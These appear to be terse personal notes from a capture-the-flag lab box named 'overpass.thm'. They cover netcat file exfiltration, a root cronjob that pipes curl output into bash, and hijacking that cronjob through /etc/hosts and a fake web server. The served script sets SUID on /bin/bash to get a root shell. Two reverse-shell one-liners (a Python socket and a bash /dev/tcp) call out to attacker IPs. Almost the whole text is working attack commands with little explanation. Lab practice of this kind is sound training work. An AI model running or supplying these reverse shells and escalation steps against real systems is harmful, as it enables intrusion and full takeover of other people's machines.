netcat sending files
nc 10.10.10.10 1234 < out.file
nc -lvnp 1234 > file.txt

scan using linpeas.sh

this is a cronjob
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
every minute,every hour,every month, every year * ** * 

edit /etc/hosts
ping overpass.thm

checking permission on /bin/bash
ls -al /bin/bash

after editing /etc/hosts create a fake directory in ur local pc
mkdir -p /downloads/src

now create a bash script

#!/bin/bash
chmod +s /bin/bash

create a python server in the fake directory
sudo python3 -m http.server 80

watch ls -al /bin/bash

/bin/bash -p

__Reverse shell__
--my way--
#!/bin/bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.49.217",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

listen on attacker machine
nc -lvnp 4444

--also my way--
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.208.81/4444 0>&1"